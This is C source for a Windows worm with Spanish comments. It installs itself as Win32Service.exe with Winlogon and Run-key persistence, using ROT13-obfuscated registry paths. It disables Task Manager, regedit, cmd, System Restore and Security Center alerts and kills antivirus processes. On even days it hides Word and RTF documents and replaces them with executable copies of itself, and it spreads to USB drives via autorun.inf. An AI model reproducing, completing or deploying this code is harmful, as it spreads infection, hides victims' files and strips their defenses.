#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <winioctl.h>
#include <dbt.h>

#define WIN32_LEAN_AND_MEAN

#include "MyLib.h"
#include "KillProc.h"

#define HKLM HKEY_LOCAL_MACHINE
#define HKCU HKEY_CURRENT_USER

#define ROTY_EXE "\\Win32Service.exe"
#define MzG MessageBox

int Zipear(char *in, char *out, char *store_as);

int WinVersion=0;

DWORD Id;

LPSTR GetMyFile(int i)
{

     char sysdir[256];
     char pathname[256];
    
     GetSystemDirectory(sysdir,sizeof(sysdir));
     
     HMODULE hMe = GetModuleHandle(NULL);
     DWORD nRet = GetModuleFileName(hMe,pathname,256);
     
     HWND WndHide = GetForegroundWindow();
     strcat(sysdir,ROTY_EXE);  
     
     if (i==1)
     {
        char* szName = new char[256];
        lstrcpy(szName,sysdir);
        return szName;
     }
     if (i==2)
     {
        char* szName = new char[256];
        lstrcpy(szName,pathname);
        return szName;
     }
}

/******************Comprobar si un archivo existe***************************/
bool FileExists(char *n)
{
     HANDLE H;
     H=CreateFile(n,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);
     if(NULL==H || H==INVALID_HANDLE_VALUE)
     {
		 return false;
	 }
     else
     {
		 return true;
	 }
}

/***********************Crear un Mutex **************************************/
void XMutex()
{
     CreateMutex(NULL,true,"(-_ROtpyrcX_-)");
     if(GetLastError()==ERROR_ALREADY_EXISTS)
     {
        ExitProcess(0);
     }
}

/*************** Buscar Archivos de tipo Word para Infectar******************/

void FindFiles(char *dir)
{
     char file[256];    
     int contando;
     char buffer[256];
     WIN32_FIND_DATA datos;
     HANDLE buscar;
     bool Loop=true;
     sprintf(buffer,"%s*.*",dir);
     buscar=FindFirstFile(buffer,&datos);
     if(buscar!=INVALID_HANDLE_VALUE)
     {
        while(Loop)
        {
           if((datos.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY 
           ||datos.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM)
           && (strstr(datos.cFileName,".")==0))
           {
              char buf[256];
              sprintf(buf,"%s%s\\",dir,datos.cFileName);
              FindFiles(buf);
           }
           if(strstr(strupr(datos.cFileName),".DOC")|| strstr(strupr(datos.cFileName),".DOCX")||strstr(strupr(datos.cFileName),".RTF"))
           {
              char ass[256];
              char *result;
              sprintf(ass,"%s",datos.cFileName);
              result = strpbrk( _strrev(ass), "." );
              _strrev(result);
              sprintf(file,"%s%s",dir,datos.cFileName);
              SetFileAttributes(file,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
              sprintf(file,"%s%s%s",dir,result,"exe");
              CopyFile(GetMyFile(2),file,0); 
              SetFileAttributes(file,FILE_ATTRIBUTE_NORMAL);
     
              
              contando++;
           }
        Loop=FindNextFile((void*)buscar,&datos);
        }
     }
     FindClose((void *)buscar);
}

/****************** Buscar Unidades de Disco******************/
void Get_Drives()
{
     char buf[MAX_PATH];
     DWORD buf_size, cnt;
     
     buf_size = GetLogicalDriveStrings(256, buf);
     
     cnt = 0;
     
     while(cnt<buf_size) {
		if((GetDriveType(&buf[cnt])==DRIVE_REMOTE) || (GetDriveType(&buf[cnt])==DRIVE_FIXED)) 
        { 
          FindFiles(&buf[cnt]); 
        } 
		cnt += lstrlen(&buf[cnt])+1;
	}
}


/**** Obtengo la version del Sistema Operativo*******/
void GetOSVersion()
{
     OSVERSIONINFO SistOpe;
     SistOpe.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
     GetVersionEx(&SistOpe);
     if (SistOpe.dwPlatformId ==VER_PLATFORM_WIN32_WINDOWS)
     {
		 WinVersion=1;
	 }
	 else
	 {
		 WinVersion=2;
	 }
}
/* Verifica si Es un dia par si es así llama a la función que buscara los archivos de word*/
void PayDate()
{
    SYSTEMTIME t;
    GetSystemTime(&t);
    if(t.wDay % 2 == 0)
    Get_Drives();
}

LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

char szClassName[ ] = "WindowsApp";


/*Crea Entradas del Registro para deshabilitar herramientas y se copia a sysdir*/
void Install()
{
     
     char SKey[128];
	 char Vkey[32];
	 char *Val3;
		
	 DWORD Val=1;
	 DWORD Val1=0;
	 DWORD Val2=2;
     
     GetOSVersion();
     
	 if (FileExists(GetMyFile(1))==FALSE )
	 {
	    CopyFile(GetMyFile(2),GetMyFile(1),false);
		SetFileAttributes(GetMyFile(1),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
		
		
		HKEY hkey;
		if(WinVersion==2)
		{
			char Temp[256];
			k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf AG\\PheeragIrefvba\\Jvaybtba\\");
			k(Vkey,"Furyy");
			sprintf(Temp,"%s%s","Explorer.exe ",GetMyFile(1));
			RegOpenKeyEx(HKLM,SKey,0,KEY_SET_VALUE,&hkey);
			RegSetValueEx(hkey,Vkey,0,REG_SZ,(const unsigned char*)Temp,lstrlen(Temp));
		}
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");
		k(Vkey,"Furyy");
		RegOpenKeyEx(HKLM,SKey,0,KEY_SET_VALUE,&hkey);
		RegSetValueEx(hkey,Vkey,0,REG_SZ,(const unsigned char*)GetMyFile(1),lstrlen(GetMyFile(1)));
	
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Cbyvpvrf\\Flfgrz\\");
		RegCreateKey(HKCU,SKey,&hkey);
		k(Vkey,"QvfnoyrGnfxZte");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"QvfnoyrErtvfgelGbbyf");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Cbyvpvrf\\Zvpebfbsg\\Jvaqbjf\\Flfgrz\\");
		RegCreateKey(HKCU,SKey,&hkey);
		k(Vkey,"QvfnoyrPZQ");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Cbyvpvrf\\Rkcybere\\");
		RegCreateKey(HKCU,SKey,&hkey);
		k(Vkey,"AbSbyqreBcgvbaf");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"AbSvaq");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"AbEha");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
        
        k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\Nqinaprq\\");
		RegCreateKey(HKCU,SKey,&hkey);
		k(Vkey,"Uvqqra");
        RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
        k(Vkey,"UvqrSvyrRkg");
        RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
        k(Vkey,"FubjFhcreUvqqra");
        RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Cbyvpvrf\\Rkcybere\\");
        RegCreateKey(HKLM,SKey,&hkey);
        k(Vkey,"AbSvaq");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"AbEha");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"FBSGJNER\\Zvpebfbsg\\Jvaqbjf AG\\PheeragIrefvba\\FlfgrzErfgber\\");
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"QvfnoyrFE");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"QvfnoyrPbasvt");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"FBSGJNER\\Zvpebfbsg\\Jvaqbjf AG\\PheeragIrefvba\\FlfgrzErfgber\\");
		RegCreateKey(HKCU,SKey,&hkey);
		k(Vkey,"QvfnoyrFE");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\Nqinaprq\\Sbyqre\\FhcreUvqqra\\");
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"HapurpxrqInyhr");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\Nqinaprq\\Sbyqre\\UvqrSvyrRkg\\");
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"HapurpxrqInyhr");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\Nqinaprq\\Sbyqre\\Uvqqra\\FUBJNYY\\");
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"PurpxrqInyhr");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
		k(Vkey,"QrsnhygInyhr");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
		
		k(SKey,"Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\Nqinaprq\\Sbyqre\\Uvqqra\\ABUVQQRA\\");
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"PurpxrqInyhr");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
		k(Vkey,"QrsnhygInyhr");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val1,sizeof(DWORD));
		
        k(SKey,"Fbsgjner\\Pynffrf\\rkrsvyr\\");				
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"ArireFubjRkg");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		
		k(SKey,"FBSGJNER\\Zvpebfbsg\\Frphevgl Pragre\\");
		RegCreateKey(HKLM,SKey,&hkey);
		k(Vkey,"NagvIvehfQvfnoyrAbgvsl");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"SverjnyyQvfnoyrAbgvsl");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
		k(Vkey,"HcqngrfQvfnoyrAbgvsl");
		RegSetValueEx(hkey,Vkey,0,REG_DWORD,(const BYTE*)&Val,sizeof(DWORD));
				
		RegCloseKey(hkey);	
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////


int WINAPI WinMain (HINSTANCE hThisInstance,HINSTANCE hPrevInstance,
                   LPSTR lpszArgument,int nFunsterStil)
{
    XMutex();
    Install();     
   	CreateThread(0,0,endAvSoft,0,0,&Id);
	Zipear(GetMyFile(1),"C:\\testamor.zip","amor.exe");
	PayDate();
	
	
    HWND hwnd;
    MSG messages;
    WNDCLASSEX wincl;

    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);

    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;

    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;


    if (!RegisterClassEx (&wincl))
        return 0;


    hwnd = CreateWindowEx (0,szClassName,"Windows App",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,
           CW_USEDEFAULT,544,375,HWND_DESKTOP,NULL,hThisInstance,NULL);

    ShowWindow (hwnd, SW_HIDE);


    while (GetMessage (&messages, NULL, 0, 0))
    {

        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return messages.wParam;

}



char FirstDriveFromMask (ULONG unitmask)
{
     
     char i;

     for (i = 0; i < 26; ++i)
     {
         if (unitmask & 0x1)
         break;
         unitmask = unitmask >> 1;
     }
     return (i + 'A');
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
     FILE *fp;
     char Neka[MAX_PATH];
     char NewPath[MAX_PATH];
     char szMsg[80];
     
     PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;

     switch (message)
     {
        case WM_DESTROY:
        PostQuitMessage (0);
        break;
        
        case WM_DEVICECHANGE:
        switch(wParam)
        {
            case DBT_DEVICEARRIVAL:
            {
                 if (lpdb -> dbch_devicetype == DBT_DEVTYP_VOLUME)
                 {
                          PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
                          if (!lpdbv -> dbcv_flags & DBTF_MEDIA)
                          {
                              wsprintf (szMsg, "%c:\\", FirstDriveFromMask(lpdbv ->dbcv_unitmask));
                              strcpy(Neka,szMsg);
                              strcpy(NewPath,szMsg);
                              strcat(Neka,"doc.exe");
                              strcat(NewPath,"autorun.inf");
                              
                              if (FileExists(Neka)==FALSE )
                              {
                                  CopyFile(GetMyFile(2),Neka,0);
                                  char autostr[]="[Autorun]\nicon=shell32.dll,4\nopen=doc.exe\nShellExecute=doc.exe\nshell\\Auto\\command=doc.exe\naction=Abrir carpeta para ver archivos";
                                  fp = fopen(NewPath,"w");
                                  fprintf(fp,autostr);
                                  fclose(fp);
                                  SetFileAttributes(NewPath,FILE_ATTRIBUTE_HIDDEN);
                              }
                          }
                 }
            }
        }
        
        break;
        default:
        return DefWindowProc (hwnd, message, wParam, lParam);
     }
return 0;
}

